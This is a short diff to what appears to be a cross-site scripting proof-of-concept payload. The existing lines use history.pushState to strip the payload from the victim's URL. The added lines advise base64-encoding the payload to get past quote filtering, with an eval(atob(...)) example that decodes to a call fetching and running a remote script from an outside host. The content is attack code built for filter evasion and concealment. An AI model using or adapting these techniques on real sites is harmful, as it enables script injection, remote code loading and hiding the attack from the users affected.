@@ -8,3 +8,7 @@
 // Some extra commands
 console.log('Dance should start any minute now')              // console message
 history.pushState({}, "secure", "/nothing/to/see/here.html"); // remove payload from url 
+
+//if you can't use ' " on your payload, here is a nice way to get around it
+// use base64 to encode the payload
+// eval(atob(`JC5nZXRTY3JpcHQoJ2h0dHBzOi8vZGluaXNjcnV6LmdpdGh1Yi5pby9YU1MtUG9jcy9wb2NzL2RhbmNlLXhzcy5qcycp`))
